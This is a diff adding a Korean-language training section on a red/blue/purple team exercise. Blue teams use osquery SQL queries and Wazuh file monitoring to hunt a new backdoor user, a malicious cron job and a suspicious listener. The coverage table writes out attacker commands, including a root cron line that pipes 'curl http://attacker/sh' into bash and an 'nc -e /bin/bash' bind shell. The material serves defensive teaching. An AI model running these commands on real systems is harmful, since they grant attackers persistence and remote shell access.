@@ -1232,6 +1232,122 @@ sudo rm -f /tmp/.hidden_nc
 
 ---
 
+## 16.6 R/B/P 종합 시나리오 — 호스트 가시화 의 SQL 헌팅 통합
+
+본 주차 의 osquery 의 3 케이스 (신규 user+key / cron backdoor / 의심 process) 의 R/B/P
+통합 분석. 네트워크 detection (W04-W06) 과 다른 **호스트 의 상태** 가시화 = osquery 의 핵심.
+
+### 통합 도식
+
+```mermaid
+graph LR
+    R["🔴 Red Team<br/>attacker → web (10.20.32.80)<br/>3 침해 패턴<br/>① 신규 user + ssh key<br/>② backdoor cron<br/>③ 의심 process"]
+
+    HOST["🌐 web 호스트<br/>OS state<br/>processes/users/files<br/>cron/listening_ports"]
+
+    B1["🔵 osquery 158 table<br/>SQL 추상화<br/>processes/users/<br/>authorized_keys/crontab"]
+    B2["🔵 SQL JOIN 헌팅<br/>processes JOIN<br/>listening_ports<br/>= 의심 process 추적"]
+    B3["🔵 file_events 테이블<br/>FIM 실시간<br/>/etc/passwd<br/>/etc/cron.d/"]
+    B4["🔵 scheduled_query<br/>5분 주기 헌팅<br/>diff 만 결과"]
+    B5["🔵 Wazuh syscheck<br/>agent ship<br/>realtime FIM"]
+
+    P1["🟣 Coverage Matrix<br/>3 케이스 × 5 detection"]
+    P2["🟣 Gap<br/>fileless = memory only<br/>cron 외 의 schedule<br/>(systemd timer)"]
+    P3["🟣 baseline 보완<br/>scheduled_query 추가<br/>noexec mount<br/>syscheck realtime"]
+    P4["🟣 AAR + 헌팅 쿼리 자산화"]
+
+    R -->|침해| HOST
+    HOST --> B1
+    B1 --> B2
+    HOST --> B3
+    B3 --> B5
+    B2 --> B4
+    B4 --> B5
+    B5 --> P1
+    P1 --> P2
+    P2 --> P3
+    P3 -.->|osquery.conf 패치| B4
+
+    style R fill:#f85149,color:#fff
+    style HOST fill:#3fb950,color:#fff
+    style B1 fill:#1f6feb,color:#fff
+    style B2 fill:#1f6feb,color:#fff
+    style B3 fill:#1f6feb,color:#fff
+    style B4 fill:#1f6feb,color:#fff
+    style B5 fill:#1f6feb,color:#fff
+    style P1 fill:#bc8cff,color:#fff
+    style P2 fill:#bc8cff,color:#fff
+    style P3 fill:#bc8cff,color:#fff
+    style P4 fill:#bc8cff,color:#fff
+```
+
+### Coverage Matrix — 3 침해 패턴
+
+| 패턴 | Red 명령 | Blue 1차 (osquery SQL) | Blue 2차 (Wazuh FIM) | Purple Gap | Purple 권장 |
+|------|---------|----------------------|---------------------|-----------|------------|
+| **① 신규 user + key** | `useradd -m bdadm; mkdir -p ~bdadm/.ssh; echo 'ssh-rsa ...' > ~bdadm/.ssh/authorized_keys` | `SELECT u.username, a.key FROM users u JOIN authorized_keys a ON u.uid=a.uid WHERE u.uid > 1000` | syscheck 의 /etc/passwd 변경 + /home/*/.ssh/* 의 file_events | scheduled_query 의 5분 주기 = 5분 의 탐지 지연 | scheduled_query interval 60s + Wazuh rule 5901 (passwd 변경) realtime |
+| **② backdoor cron** | `echo '* * * * * root curl http://attacker/sh | bash' > /etc/cron.d/sync` | `SELECT command, path FROM crontab WHERE command LIKE '%curl%bash%'` | file_events 의 /etc/cron.d/* 의 INSERT | systemd timer / at job 의 미탐지 (cron 만 검사) | crontab + startup_items + systemd_units 의 3-source JOIN |
+| **③ 의심 process** | `nohup nc -l -p 31337 -e /bin/bash &` (background listener) | `SELECT p.pid, p.name, l.port FROM processes p JOIN listening_ports l ON p.pid=l.pid WHERE l.port NOT IN (22, 80, 443, ...)` | osquery scheduled_query 의 5분 주기 결과 = Wazuh agent ship | fileless (memory only) = disk 의 흔적 없음 | osquery process_events (audit 기반) + memory dump 의 별도 분석 |
+
+### 시간선 — 신규 user + ssh key 의 1 사건 흐름
+
+```
+T+0    Red attacker → web (10.20.32.80) 의 침해 (SSH brute or RCE)
+       └→ web shell 의 root 권한 획득
+       └→ useradd -m bdadm
+       └→ mkdir -p ~bdadm/.ssh
+       └→ echo 'ssh-rsa AAAAB3... attacker@evil' > ~bdadm/.ssh/authorized_keys
+
+T+1s   Blue 1차 (file_events realtime)
+       └→ osquery 의 file_events 테이블 의 INSERT 트리거
+          - path: /etc/passwd, action: UPDATED
+          - path: /home/bdadm/.ssh/authorized_keys, action: CREATED
+       └→ Wazuh syscheck realtime alert 발송 (rule 5901, level 10)
+
+T+5s   Blue 2차 (운영자 의 osquery SQL 헌팅)
+       └→ ssh 6v6-web 'sudo osqueryi --json "SELECT u.username, u.uid, a.key
+             FROM users u JOIN authorized_keys a ON u.uid=a.uid
+             WHERE u.uid > 1000"'
+       └→ 결과 = bdadm uid=1001 + ssh-rsa ... attacker@evil
+       └→ 정상 사용자 (admin uid=1000) 와 비교 → 비정상 = 침해 명확
+
+T+30s  Purple Gap 식별 (Coverage Matrix 의 ①)
+       └→ scheduled_query 의 interval 이 300s = 5분 의 탐지 지연 가능
+       └→ realtime 의 file_events 가 보강 했지만 osquery shutdown 시 누락 위험
+
+T+5m   Purple baseline 보완
+       └→ /etc/osquery/osquery.conf 의 schedule 의 user_added 쿼리 interval 60s
+       └→ Wazuh agent 의 syscheck realtime 의 /etc/passwd + /home/*/.ssh/* directory 추가
+       └→ noexec mount = /tmp + /home 의 noexec option 적용 (실행 차단)
+
+T+15m  Purple AAR + 헌팅 쿼리 자산화
+       └→ 본 사건 의 헌팅 쿼리 = osquery_pack/incident.conf 에 영구 등록
+       └→ Wazuh CDB list 에 attacker 도메인 추가 → 차단
+       └→ W08 시험 의 시나리오 1 = 본 케이스 변형
+```
+
+### R/B/P 의 핵심 인사이트
+
+1. **OS as SQL 의 운영 가치** — osquery 의 158 table + JOIN 으로 호스트 의 임의 상태
+   를 SQL 한 줄 로 헌팅 가능. shell 스크립트 의 대체.
+
+2. **file_events 의 realtime vs scheduled 의 trade-off** — realtime = 즉시 탐지 +
+   부하 / scheduled = 5분 지연 + 안정. 중요 path (/etc/passwd, /etc/cron.d/) 만
+   realtime, 나머지 = scheduled.
+
+3. **JOIN 의 강력함** — processes + listening_ports + users 의 3 JOIN 으로 의심
+   process 의 owner + 노출 port 를 한 번 에 추적. shell 의 ps + netstat + lsof 의 3
+   명령 의 대체.
+
+4. **fileless 의 한계** — osquery 는 disk 의 상태 만 가시화. memory only 의 fileless
+   공격 (in-memory shellcode) 은 osquery process_events (audit 기반) + memory dump
+   분석 (volatility) 의 별도 분석 필요.
+
+5. **헌팅 쿼리 의 자산화** — incident 의 검출 쿼리 = osquery_pack 의 영구 자산 화.
+   다음 incident 의 즉시 재사용 + W08 시험 의 시나리오 base.
+
+---
+
 ## 17. 평가 기준
 
 | 항목 | 비중 |
